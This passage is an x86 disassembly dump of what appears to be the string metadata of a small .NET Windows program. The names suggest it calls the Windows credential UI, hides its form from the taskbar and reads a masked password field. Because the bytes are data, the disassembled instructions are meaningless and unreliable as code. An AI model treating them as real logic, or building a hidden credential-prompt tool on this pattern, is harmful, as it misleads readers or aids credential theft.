  407cd9:	73 65                	jae    0x407d40
  407cdb:	6d                   	insl   (%dx),%es:(%edi)
  407cdc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407ce0:	6f                   	outsl  %ds:(%esi),(%dx)
  407ce1:	70 79                	jo     0x407d5c
  407ce3:	72 69                	jb     0x407d4e
  407ce5:	67 68 74 41 74 74    	addr16 push $0x74744174
  407ceb:	72 69                	jb     0x407d56
  407ced:	62 75 74             	bound  %esi,0x74(%ebp)
  407cf0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407cf4:	73 65                	jae    0x407d5b
  407cf6:	6d                   	insl   (%dx),%es:(%edi)
  407cf7:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  407cfb:	72 61                	jb     0x407d5e
  407cfd:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  407d00:	61                   	popa
  407d01:	72 6b                	jb     0x407d6e
  407d03:	41                   	inc    %ecx
  407d04:	74 74                	je     0x407d7a
  407d06:	72 69                	jb     0x407d71
  407d08:	62 75 74             	bound  %esi,0x74(%ebp)
  407d0b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  407d0f:	73 65                	jae    0x407d76
  407d11:	6d                   	insl   (%dx),%es:(%edi)
  407d12:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  407d16:	65 73 63             	gs jae 0x407d7c
  407d19:	72 69                	jb     0x407d84
  407d1b:	70 74                	jo     0x407d91
  407d1d:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  407d24:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  407d2b:	73 73                	jae    0x407da0
  407d2d:	65 6d                	gs insl (%dx),%es:(%edi)
  407d2f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  407d33:	6f                   	outsl  %ds:(%esi),(%dx)
  407d34:	6d                   	insl   (%dx),%es:(%edi)
  407d35:	70 61                	jo     0x407d98
  407d37:	6e                   	outsb  %ds:(%esi),(%dx)
  407d38:	79 41                	jns    0x407d7b
  407d3a:	74 74                	je     0x407db0
  407d3c:	72 69                	jb     0x407da7
  407d3e:	62 75 74             	bound  %esi,0x74(%ebp)
  407d41:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  407d45:	73 74                	jae    0x407dbb
  407d47:	65 6d                	gs insl (%dx),%es:(%edi)
  407d49:	2e 52                	cs push %edx
  407d4b:	75 6e                	jne    0x407dbb
  407d4d:	74 69                	je     0x407db8
  407d4f:	6d                   	insl   (%dx),%es:(%edi)
  407d50:	65 2e 43             	gs cs inc %ebx
  407d53:	6f                   	outsl  %ds:(%esi),(%dx)
  407d54:	6d                   	insl   (%dx),%es:(%edi)
  407d55:	70 69                	jo     0x407dc0
  407d57:	6c                   	insb   (%dx),%es:(%edi)
  407d58:	65 72 53             	gs jb  0x407dae
  407d5b:	65 72 76             	gs jb  0x407dd4
  407d5e:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  407d65:	6d                   	insl   (%dx),%es:(%edi)
  407d66:	70 69                	jo     0x407dd1
  407d68:	6c                   	insb   (%dx),%es:(%edi)
  407d69:	61                   	popa
  407d6a:	74 69                	je     0x407dd5
  407d6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407d6d:	6e                   	outsb  %ds:(%esi),(%dx)
  407d6e:	52                   	push   %edx
  407d6f:	65 6c                	gs insb (%dx),%es:(%edi)
  407d71:	61                   	popa
  407d72:	78 61                	js     0x407dd5
  407d74:	74 69                	je     0x407ddf
  407d76:	6f                   	outsl  %ds:(%esi),(%dx)
  407d77:	6e                   	outsb  %ds:(%esi),(%dx)
  407d78:	73 41                	jae    0x407dbb
  407d7a:	74 74                	je     0x407df0
  407d7c:	72 69                	jb     0x407de7
  407d7e:	62 75 74             	bound  %esi,0x74(%ebp)
  407d81:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  407d85:	6e                   	outsb  %ds:(%esi),(%dx)
  407d86:	74 69                	je     0x407df1
  407d88:	6d                   	insl   (%dx),%es:(%edi)
  407d89:	65 43                	gs inc %ebx
  407d8b:	6f                   	outsl  %ds:(%esi),(%dx)
  407d8c:	6d                   	insl   (%dx),%es:(%edi)
  407d8d:	70 61                	jo     0x407df0
  407d8f:	74 69                	je     0x407dfa
  407d91:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  407d94:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  407d9b:	69 
  407d9c:	62 75 74             	bound  %esi,0x74(%ebp)
  407d9f:	65 00 74 65 73       	add    %dh,%gs:0x73(%ebp,%eiz,2)
  407da4:	74 32                	je     0x407dd8
  407da6:	00 44 6c 6c          	add    %al,0x6c(%esp,%ebp,2)
  407daa:	49                   	dec    %ecx
  407dab:	6d                   	insl   (%dx),%es:(%edi)
  407dac:	70 6f                	jo     0x407e1d
  407dae:	72 74                	jb     0x407e24
  407db0:	41                   	inc    %ecx
  407db1:	74 74                	je     0x407e27
  407db3:	72 69                	jb     0x407e1e
  407db5:	62 75 74             	bound  %esi,0x74(%ebp)
  407db8:	65 00 63 72          	add    %ah,%gs:0x72(%ebx)
  407dbc:	65 64 75 69          	gs fs jne 0x407e29
  407dc0:	00 53 74             	add    %dl,0x74(%ebx)
  407dc3:	72 69                	jb     0x407e2e
  407dc5:	6e                   	outsb  %ds:(%esi),(%dx)
  407dc6:	67 00 49 73          	add    %cl,0x73(%bx,%di)
  407dca:	4e                   	dec    %esi
  407dcb:	75 6c                	jne    0x407e39
  407dcd:	6c                   	insb   (%dx),%es:(%edi)
  407dce:	4f                   	dec    %edi
  407dcf:	72 45                	jb     0x407e16
  407dd1:	6d                   	insl   (%dx),%es:(%edi)
  407dd2:	70 74                	jo     0x407e48
  407dd4:	79 00                	jns    0x407dd6
  407dd6:	4d                   	dec    %ebp
  407dd7:	61                   	popa
  407dd8:	72 73                	jb     0x407e4d
  407dda:	68 61 6c 00 53       	push   $0x53006c61
  407ddf:	69 7a 65 4f 66 00 49 	imul   $0x4900664f,0x65(%edx),%edi
  407de6:	6e                   	outsb  %ds:(%esi),(%dx)
  407de7:	74 50                	je     0x407e39
  407de9:	74 72                	je     0x407e5d
  407deb:	00 5a 65             	add    %bl,0x65(%edx)
  407dee:	72 6f                	jb     0x407e5f
  407df0:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  407df4:	74 72                	je     0x407e68
  407df6:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  407dfd:	75 63                	jne    0x407e62
  407dff:	74 4c                	je     0x407e4d
  407e01:	61                   	popa
  407e02:	79 6f                	jns    0x407e73
  407e04:	75 74                	jne    0x407e7a
  407e06:	41                   	inc    %ecx
  407e07:	74 74                	je     0x407e7d
  407e09:	72 69                	jb     0x407e74
  407e0b:	62 75 74             	bound  %esi,0x74(%ebp)
  407e0e:	65 00 4c 61 79       	add    %cl,%gs:0x79(%ecx,%eiz,2)
  407e13:	6f                   	outsl  %ds:(%esi),(%dx)
  407e14:	75 74                	jne    0x407e8a
  407e16:	4b                   	dec    %ebx
  407e17:	69 6e 64 00 46 6c 61 	imul   $0x616c4600,0x64(%esi),%ebp
  407e1e:	67 73 41             	addr16 jae 0x407e62
  407e21:	74 74                	je     0x407e97
  407e23:	72 69                	jb     0x407e8e
  407e25:	62 75 74             	bound  %esi,0x74(%ebp)
  407e28:	65 00 45 6d          	add    %al,%gs:0x6d(%ebp)
  407e2c:	70 74                	jo     0x407ea2
  407e2e:	79 00                	jns    0x407e30
  407e30:	43                   	inc    %ebx
  407e31:	6c                   	insb   (%dx),%es:(%edi)
  407e32:	6f                   	outsl  %ds:(%esi),(%dx)
  407e33:	73 65                	jae    0x407e9a
  407e35:	00 73 65             	add    %dh,0x65(%ebx)
  407e38:	74 5f                	je     0x407e99
  407e3a:	4f                   	dec    %edi
  407e3b:	70 61                	jo     0x407e9e
  407e3d:	63 69 74             	arpl   %ebp,0x74(%ecx)
  407e40:	79 00                	jns    0x407e42
  407e42:	73 65                	jae    0x407ea9
  407e44:	74 5f                	je     0x407ea5
  407e46:	53                   	push   %ebx
  407e47:	68 6f 77 49 6e       	push   $0x6e49776f
  407e4c:	54                   	push   %esp
  407e4d:	61                   	popa
  407e4e:	73 6b                	jae    0x407ebb
  407e50:	62 61 72             	bound  %esp,0x72(%ecx)
  407e53:	00 43 6f             	add    %al,0x6f(%ebx)
  407e56:	6e                   	outsb  %ds:(%esi),(%dx)
  407e57:	74 72                	je     0x407ecb
  407e59:	6f                   	outsl  %ds:(%esi),(%dx)
  407e5a:	6c                   	insb   (%dx),%es:(%edi)
  407e5b:	00 73 65             	add    %dh,0x65(%ebx)
  407e5e:	74 5f                	je     0x407ebf
  407e60:	56                   	push   %esi
  407e61:	69 73 69 62 6c 65 00 	imul   $0x656c62,0x69(%ebx),%esi
  407e68:	67 65 74 5f          	addr16 gs je 0x407ecb
  407e6c:	42                   	inc    %edx
  407e6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407e6e:	74 74                	je     0x407ee4
  407e70:	6f                   	outsl  %ds:(%esi),(%dx)
  407e71:	6d                   	insl   (%dx),%es:(%edi)
  407e72:	00 67 65             	add    %ah,0x65(%edi)
  407e75:	74 5f                	je     0x407ed6
  407e77:	54                   	push   %esp
  407e78:	6f                   	outsl  %ds:(%esi),(%dx)
  407e79:	70 00                	jo     0x407e7b
  407e7b:	67 65 74 5f          	addr16 gs je 0x407ede
  407e7f:	52                   	push   %edx
  407e80:	69 67 68 74 00 67 65 	imul   $0x65670074,0x68(%edi),%esp
  407e87:	74 5f                	je     0x407ee8
  407e89:	4c                   	dec    %esp
  407e8a:	65 66 74 00          	gs data16 je 0x407e8e
  407e8e:	41                   	inc    %ecx
  407e8f:	64 64 72 65          	fs fs jb 0x407ef8
  407e93:	73 73                	jae    0x407f08
  407e95:	00 42 75             	add    %al,0x75(%edx)
  407e98:	66 66 65 72 43       	data16 data16 gs jb 0x407ee0
  407e9d:	65 6c                	gs insb (%dx),%es:(%edi)
  407e9f:	6c                   	insb   (%dx),%es:(%edi)
  407ea0:	54                   	push   %esp
  407ea1:	79 70                	jns    0x407f13
  407ea3:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  407ea7:	74 5f                	je     0x407f08
  407ea9:	58                   	pop    %eax
  407eaa:	00 73 65             	add    %dh,0x65(%ebx)
  407ead:	74 5f                	je     0x407f0e
  407eaf:	59                   	pop    %ecx
  407eb0:	00 73 65             	add    %dh,0x65(%ebx)
  407eb3:	74 5f                	je     0x407f14
  407eb5:	48                   	dec    %eax
  407eb6:	65 69 67 68 74 00 73 	imul   $0x65730074,%gs:0x68(%edi),%esp
  407ebd:	65 
  407ebe:	74 5f                	je     0x407f1f
  407ec0:	57                   	push   %edi
  407ec1:	69 64 74 68 00 41 70 	imul   $0x70704100,0x68(%esp,%esi,2),%esp
  407ec8:	70 
  407ec9:	44                   	inc    %esp
  407eca:	6f                   	outsl  %ds:(%esi),(%dx)
  407ecb:	6d                   	insl   (%dx),%es:(%edi)
  407ecc:	61                   	popa
  407ecd:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407ed4:	43                   	inc    %ebx
  407ed5:	75 72                	jne    0x407f49
  407ed7:	72 65                	jb     0x407f3e
  407ed9:	6e                   	outsb  %ds:(%esi),(%dx)
  407eda:	74 44                	je     0x407f20
  407edc:	6f                   	outsl  %ds:(%esi),(%dx)
  407edd:	6d                   	insl   (%dx),%es:(%edi)
  407ede:	61                   	popa
  407edf:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  407ee6:	46                   	inc    %esi
  407ee7:	72 69                	jb     0x407f52
  407ee9:	65 6e                	outsb  %gs:(%esi),(%dx)
  407eeb:	64 6c                	fs insb (%dx),%es:(%edi)
  407eed:	79 4e                	jns    0x407f3d
  407eef:	61                   	popa
  407ef0:	6d                   	insl   (%dx),%es:(%edi)
  407ef1:	65 00 75 73          	add    %dh,%gs:0x73(%ebp)
  407ef5:	65 72 33             	gs jb  0x407f2b
  407ef8:	32 2e                	xor    (%esi),%ch
  407efa:	64 6c                	fs insb (%dx),%es:(%edi)
  407efc:	6c                   	insb   (%dx),%es:(%edi)
  407efd:	00 53 69             	add    %dl,0x69(%ebx)
  407f00:	7a 65                	jp     0x407f67
  407f02:	46                   	inc    %esi
  407f03:	00 43 6f             	add    %al,0x6f(%ebx)
  407f06:	6e                   	outsb  %ds:(%esi),(%dx)
  407f07:	74 61                	je     0x407f6a
  407f09:	69 6e 65 72 43 6f 6e 	imul   $0x6e6f4372,0x65(%esi),%ebp
  407f10:	74 72                	je     0x407f84
  407f12:	6f                   	outsl  %ds:(%esi),(%dx)
  407f13:	6c                   	insb   (%dx),%es:(%edi)
  407f14:	00 73 65             	add    %dh,0x65(%ebx)
  407f17:	74 5f                	je     0x407f78
  407f19:	41                   	inc    %ecx
  407f1a:	75 74                	jne    0x407f90
  407f1c:	6f                   	outsl  %ds:(%esi),(%dx)
  407f1d:	53                   	push   %ebx
  407f1e:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f21:	65 44                	gs inc %esp
  407f23:	69 6d 65 6e 73 69 6f 	imul   $0x6f69736e,0x65(%ebp),%ebp
  407f2a:	6e                   	outsb  %ds:(%esi),(%dx)
  407f2b:	73 00                	jae    0x407f2d
  407f2d:	41                   	inc    %ecx
  407f2e:	75 74                	jne    0x407fa4
  407f30:	6f                   	outsl  %ds:(%esi),(%dx)
  407f31:	53                   	push   %ebx
  407f32:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f35:	65 4d                	gs dec %ebp
  407f37:	6f                   	outsl  %ds:(%esi),(%dx)
  407f38:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  407f3d:	74 5f                	je     0x407f9e
  407f3f:	41                   	inc    %ecx
  407f40:	75 74                	jne    0x407fb6
  407f42:	6f                   	outsl  %ds:(%esi),(%dx)
  407f43:	53                   	push   %ebx
  407f44:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  407f47:	65 4d                	gs dec %ebp
  407f49:	6f                   	outsl  %ds:(%esi),(%dx)
  407f4a:	64 65 00 54 65 78    	fs add %dl,%gs:0x78(%ebp,%eiz,2)
  407f50:	74 42                	je     0x407f94
  407f52:	6f                   	outsl  %ds:(%esi),(%dx)
  407f53:	78 00                	js     0x407f55
  407f55:	42                   	inc    %edx
  407f56:	75 74                	jne    0x407fcc
  407f58:	74 6f                	je     0x407fc9
  407f5a:	6e                   	outsb  %ds:(%esi),(%dx)
  407f5b:	00 73 65             	add    %dh,0x65(%ebx)
  407f5e:	74 5f                	je     0x407fbf
  407f60:	54                   	push   %esp
  407f61:	65 78 74             	gs js  0x407fd8
  407f64:	00 50 6f             	add    %dl,0x6f(%eax)
  407f67:	69 6e 74 00 73 65 74 	imul   $0x74657300,0x74(%esi),%ebp
  407f6e:	5f                   	pop    %edi
  407f6f:	4c                   	dec    %esp
  407f70:	6f                   	outsl  %ds:(%esi),(%dx)
  407f71:	63 61 74             	arpl   %esp,0x74(%ecx)
  407f74:	69 6f 6e 00 53 63 72 	imul   $0x72635300,0x6e(%edi),%ebp
  407f7b:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  407f7e:	00 46 72             	add    %al,0x72(%esi)
  407f81:	6f                   	outsl  %ds:(%esi),(%dx)
  407f82:	6d                   	insl   (%dx),%es:(%edi)
  407f83:	43                   	inc    %ebx
  407f84:	6f                   	outsl  %ds:(%esi),(%dx)
  407f85:	6e                   	outsb  %ds:(%esi),(%dx)
  407f86:	74 72                	je     0x407ffa
  407f88:	6f                   	outsl  %ds:(%esi),(%dx)
  407f89:	6c                   	insb   (%dx),%es:(%edi)
  407f8a:	00 67 65             	add    %ah,0x65(%edi)
  407f8d:	74 5f                	je     0x407fee
  407f8f:	42                   	inc    %edx
  407f90:	6f                   	outsl  %ds:(%esi),(%dx)
  407f91:	75 6e                	jne    0x408001
  407f93:	64 73 00             	fs jae 0x407f96
  407f96:	67 65 74 5f          	addr16 gs je 0x407ff9
  407f9a:	57                   	push   %edi
  407f9b:	69 64 74 68 00 73 65 	imul   $0x74657300,0x68(%esp,%esi,2),%esp
  407fa2:	74 
  407fa3:	5f                   	pop    %edi
  407fa4:	4d                   	dec    %ebp
  407fa5:	61                   	popa
  407fa6:	78 69                	js     0x408011
  407fa8:	6d                   	insl   (%dx),%es:(%edi)
  407fa9:	75 6d                	jne    0x408018
  407fab:	53                   	push   %ebx
  407fac:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407fb3:	5f                   	pop    %edi
  407fb4:	41                   	inc    %ecx
  407fb5:	75 74                	jne    0x40802b
  407fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407fb8:	53                   	push   %ebx
  407fb9:	69 7a 65 00 43 6f 6e 	imul   $0x6e6f4300,0x65(%edx),%edi
  407fc0:	74 72                	je     0x408034
  407fc2:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc3:	6c                   	insb   (%dx),%es:(%edi)
  407fc4:	43                   	inc    %ebx
  407fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc6:	6c                   	insb   (%dx),%es:(%edi)
  407fc7:	6c                   	insb   (%dx),%es:(%edi)
  407fc8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407fcd:	6e                   	outsb  %ds:(%esi),(%dx)
  407fce:	00 67 65             	add    %ah,0x65(%edi)
  407fd1:	74 5f                	je     0x408032
  407fd3:	43                   	inc    %ebx
  407fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407fd6:	74 72                	je     0x40804a
  407fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd9:	6c                   	insb   (%dx),%es:(%edi)
  407fda:	73 00                	jae    0x407fdc
  407fdc:	41                   	inc    %ecx
  407fdd:	64 64 00 73 65       	fs add %dh,%fs:0x65(%ebx)
  407fe2:	74 5f                	je     0x408043
  407fe4:	55                   	push   %ebp
  407fe5:	73 65                	jae    0x40804c
  407fe7:	53                   	push   %ebx
  407fe8:	79 73                	jns    0x40805d
  407fea:	74 65                	je     0x408051
  407fec:	6d                   	insl   (%dx),%es:(%edi)
  407fed:	50                   	push   %eax
  407fee:	61                   	popa
  407fef:	73 73                	jae    0x408064
  407ff1:	77 6f                	ja     0x408062
  407ff3:	72 64                	jb     0x408059
  407ff5:	43                   	inc    %ebx
  407ff6:	68 61 72 00 53       	push   $0x53007261
  407ffb:	65 74 42             	gs je  0x408040
  407ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  407fff:	75 6e                	jne    0x40806f
  408001:	64 73 00             	fs jae 0x408004
  408004:	50                   	push   %eax
  408005:	74 72                	je     0x408079
  408007:	54                   	push   %esp
  408008:	6f                   	outsl  %ds:(%esi),(%dx)
  408009:	53                   	push   %ebx
  40800a:	74 72                	je     0x40807e
  40800c:	69 6e 67 55 6e 69 00 	imul   $0x696e55,0x67(%esi),%ebp
  408013:	73 65                	jae    0x40807a
  408015:	74 5f                	je     0x408076
  408017:	44                   	inc    %esp
  408018:	69 61 6c 6f 67 52 65 	imul   $0x6552676f,0x6c(%ecx),%esp
  40801f:	73 75                	jae    0x408096
  408021:	6c                   	insb   (%dx),%es:(%edi)
  408022:	74 00                	je     0x408024
  408024:	4d                   	dec    %ebp
  408025:	61                   	popa
  408026:	74 68                	je     0x408090
  408028:	00 4d 61             	add    %cl,0x61(%ebp)
  40802b:	78 00                	js     0x40802d
  40802d:	73 65                	jae    0x408094
  40802f:	74 5f                	je     0x408090
  408031:	43                   	inc    %ebx
  408032:	6c                   	insb   (%dx),%es:(%edi)
  408033:	69 65 6e 74 53 69 7a 	imul   $0x7a695374,0x6e(%ebp),%esp
  40803a:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  40803e:	64 52                	fs push %edx
  408040:	61                   	popa
  408041:	6e                   	outsb  %ds:(%esi),(%dx)
  408042:	67 65 00 46 6f       	add    %al,%gs:0x6f(%bp)
  408047:	72 6d                	jb     0x4080b6
  408049:	42                   	inc    %edx
  40804a:	6f                   	outsl  %ds:(%esi),(%dx)
  40804b:	72 64                	jb     0x4080b1
  40804d:	65 72 53             	gs jb  0x4080a3
  408050:	74 79                	je     0x4080cb
  408052:	6c                   	insb   (%dx),%es:(%edi)
  408053:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408057:	74 5f                	je     0x4080b8
  408059:	46                   	inc    %esi
  40805a:	6f                   	outsl  %ds:(%esi),(%dx)
  40805b:	72 6d                	jb     0x4080ca
  40805d:	42                   	inc    %edx
  40805e:	6f                   	outsl  %ds:(%esi),(%dx)
  40805f:	72 64                	jb     0x4080c5
  408061:	65 72 53             	gs jb  0x4080b7
  408064:	74 79                	je     0x4080df
  408066:	6c                   	insb   (%dx),%es:(%edi)
  408067:	65 00 46 6f          	add    %al,%gs:0x6f(%esi)
  40806b:	72 6d                	jb     0x4080da
  40806d:	53                   	push   %ebx
  40806e:	74 61                	je     0x4080d1
  408070:	72 74                	jb     0x4080e6
  408072:	50                   	push   %eax
  408073:	6f                   	outsl  %ds:(%esi),(%dx)
  408074:	73 69                	jae    0x4080df
  408076:	74 69                	je     0x4080e1
  408078:	6f                   	outsl  %ds:(%esi),(%dx)
  408079:	6e                   	outsb  %ds:(%esi),(%dx)
  40807a:	00 73 65             	add    %dh,0x65(%ebx)
  40807d:	74 5f                	je     0x4080de
  40807f:	53                   	push   %ebx
  408080:	74 61                	je     0x4080e3
  408082:	72 74                	jb     0x4080f8
  408084:	50                   	push   %eax
  408085:	6f                   	outsl  %ds:(%esi),(%dx)
  408086:	73 69                	jae    0x4080f1
  408088:	74 69                	je     0x4080f3
  40808a:	6f                   	outsl  %ds:(%esi),(%dx)
  40808b:	6e                   	outsb  %ds:(%esi),(%dx)
  40808c:	00 41 73             	add    %al,0x73(%ecx)
  40808f:	73 65                	jae    0x4080f6
  408091:	6d                   	insl   (%dx),%es:(%edi)
  408092:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  408096:	47                   	inc    %edi
  408097:	65 74 45             	gs je  0x4080df
  40809a:	78 65                	js     0x408101
  40809c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40809f:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  4080a6:	6d                   	insl   (%dx),%es:(%edi)
  4080a7:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4080ab:	67 65 74 5f          	addr16 gs je 0x40810e
  4080af:	4c                   	dec    %esp
  4080b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4080b1:	63 61 74             	arpl   %esp,0x74(%ecx)
  4080b4:	69 6f 6e 00 49 63 6f 	imul   $0x6f634900,0x6e(%edi),%ebp
  4080bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4080bc:	00 45 78             	add    %al,0x78(%ebp)
  4080bf:	74 72                	je     0x408133
  4080c1:	61                   	popa
  4080c2:	63 74 41 73          	arpl   %esi,0x73(%ecx,%eax,2)
  4080c6:	73 6f                	jae    0x408137
  4080c8:	63 69 61             	arpl   %ebp,0x61(%ecx)
  4080cb:	74 65                	je     0x408132
  4080cd:	64 49                	fs dec %ecx
  4080cf:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4080d2:	00 73 65             	add    %dh,0x65(%ebx)
  4080d5:	74 5f                	je     0x408136
  4080d7:	49                   	dec    %ecx
  4080d8:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  4080db:	00 73 65             	add    %dh,0x65(%ebx)
  4080de:	74 5f                	je     0x40813f
  4080e0:	4d                   	dec    %ebp
  4080e1:	69 6e 69 6d 69 7a 65 	imul   $0x657a696d,0x69(%esi),%ebp
  4080e8:	42                   	inc    %edx
  4080e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ea:	78 00                	js     0x4080ec
  4080ec:	73 65                	jae    0x408153
  4080ee:	74 5f                	je     0x40814f
  4080f0:	4d                   	dec    %ebp
  4080f1:	61                   	popa
  4080f2:	78 69                	js     0x40815d
  4080f4:	6d                   	insl   (%dx),%es:(%edi)
  4080f5:	69 7a 65 42 6f 78 00 	imul   $0x786f42,0x65(%edx),%edi
  4080fc:	49                   	dec    %ecx
  4080fd:	42                   	inc    %edx
  4080fe:	75 74                	jne    0x408174
  408100:	74 6f                	je     0x408171
  408102:	6e                   	outsb  %ds:(%esi),(%dx)
  408103:	43                   	inc    %ebx
  408104:	6f                   	outsl  %ds:(%esi),(%dx)
  408105:	6e                   	outsb  %ds:(%esi),(%dx)
  408106:	74 72                	je     0x40817a
  408108:	6f                   	outsl  %ds:(%esi),(%dx)
  408109:	6c                   	insb   (%dx),%es:(%edi)
  40810a:	00 73 65             	add    %dh,0x65(%ebx)
  40810d:	74 5f                	je     0x40816e
  40810f:	41                   	inc    %ecx
  408110:	63 63 65             	arpl   %esp,0x65(%ebx)
  408113:	70 74                	jo     0x408189
  408115:	42                   	inc    %edx
  408116:	75 74                	jne    0x40818c
  408118:	74 6f                	je     0x408189
  40811a:	6e                   	outsb  %ds:(%esi),(%dx)
  40811b:	00 73 65             	add    %dh,0x65(%ebx)
  40811e:	74 5f                	je     0x40817f
  408120:	43                   	inc    %ebx
  408121:	61                   	popa
  408122:	6e                   	outsb  %ds:(%esi),(%dx)
  408123:	63 65 6c             	arpl   %esp,0x6c(%ebp)
  408126:	42                   	inc    %edx
  408127:	75 74                	jne    0x40819d
  408129:	74 6f                	je     0x40819a
  40812b:	6e                   	outsb  %ds:(%esi),(%dx)
  40812c:	00 53 68             	add    %dl,0x68(%ebx)
  40812f:	6f                   	outsl  %ds:(%esi),(%dx)
  408130:	77 44                	ja     0x408176
  408132:	69 61 6c 6f 67 00 67 	imul   $0x6700676f,0x6c(%ecx),%esp
  408139:	65 74 5f             	gs je  0x40819b
  40813c:	54                   	push   %esp
  40813d:	65 78 74             	gs js  0x4081b4
  408140:	00 67 65             	add    %ah,0x65(%edi)
  408143:	74 5f                	je     0x4081a4
  408145:	43                   	inc    %ebx
  408146:	6f                   	outsl  %ds:(%esi),(%dx)
  408147:	75 6e                	jne    0x4081b7
  408149:	74 00                	je     0x40814b
  40814b:	52                   	push   %edx
  40814c:	61                   	popa
  40814d:	64 69 6f 42 75 74 74 	imul   $0x6f747475,%fs:0x42(%edi),%ebp
  408154:	6f 
  408155:	6e                   	outsb  %ds:(%esi),(%dx)
  408156:	00 54 6f 6f          	add    %dl,0x6f(%edi,%ebp,2)
  40815a:	6c                   	insb   (%dx),%es:(%edi)
  40815b:	54                   	push   %esp
  40815c:	69 70 00 49 45 6e 75 	imul   $0x756e4549,0x0(%eax),%esi
  408163:	6d                   	insl   (%dx),%es:(%edi)
  408164:	65 72 61             	gs jb  0x4081c8
  408167:	74 6f                	je     0x4081d8
  408169:	72 60                	jb     0x4081cb
  40816b:	31 00                	xor    %eax,(%eax)
  40816d:	47                   	inc    %edi
  40816e:	65 74 45             	gs je  0x4081b6
  408171:	6e                   	outsb  %ds:(%esi),(%dx)
  408172:	75 6d                	jne    0x4081e1
  408174:	65 72 61             	gs jb  0x4081d8
  408177:	74 6f                	je     0x4081e8
  408179:	72 00                	jb     0x40817b
  40817b:	67 65 74 5f          	addr16 gs je 0x4081de
  40817f:	43                   	inc    %ebx
  408180:	75 72                	jne    0x4081f4
  408182:	72 65                	jb     0x4081e9
  408184:	6e                   	outsb  %ds:(%esi),(%dx)
  408185:	74 00                	je     0x408187
  408187:	67 65 74 5f          	addr16 gs je 0x4081ea
  40818b:	4c                   	dec    %esp
  40818c:	61                   	popa
  40818d:	62 65 6c             	bound  %esp,0x6c(%ebp)
  408190:	00 73 65             	add    %dh,0x65(%ebx)
  408193:	74 5f                	je     0x4081f4
  408195:	43                   	inc    %ebx
  408196:	68 65 63 6b 65       	push   $0x656b6365
  40819b:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
  40819f:	74 5f                	je     0x408200
  4081a1:	48                   	dec    %eax
  4081a2:	65 69 67 68 74 00 67 	imul   $0x65670074,%gs:0x68(%edi),%esp
  4081a9:	65 
  4081aa:	74 5f                	je     0x40820b
  4081ac:	48                   	dec    %eax
  4081ad:	65 6c                	gs insb (%dx),%es:(%edi)
  4081af:	70 4d                	jo     0x4081fe
  4081b1:	65 73 73             	gs jae 0x408227
  4081b4:	61                   	popa
  4081b5:	67 65 00 53 65       	add    %dl,%gs:0x65(%bp,%di)
  4081ba:	74 54                	je     0x408210
  4081bc:	6f                   	outsl  %ds:(%esi),(%dx)
  4081bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4081be:	6c                   	insb   (%dx),%es:(%edi)
  4081bf:	54                   	push   %esp
  4081c0:	69 70 00 53 79 73 74 	imul   $0x74737953,0x0(%eax),%esi
  4081c7:	65 6d                	gs insl (%dx),%es:(%edi)
  4081c9:	2e 43                	cs inc %ebx
  4081cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cc:	6c                   	insb   (%dx),%es:(%edi)
  4081cd:	6c                   	insb   (%dx),%es:(%edi)
  4081ce:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4081d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d4:	73 00                	jae    0x4081d6
  4081d6:	49                   	dec    %ecx
  4081d7:	45                   	inc    %ebp
  4081d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4081d9:	75 6d                	jne    0x408248
  4081db:	65 72 61             	gs jb  0x40823f
  4081de:	74 6f                	je     0x40824f
  4081e0:	72 00                	jb     0x4081e2
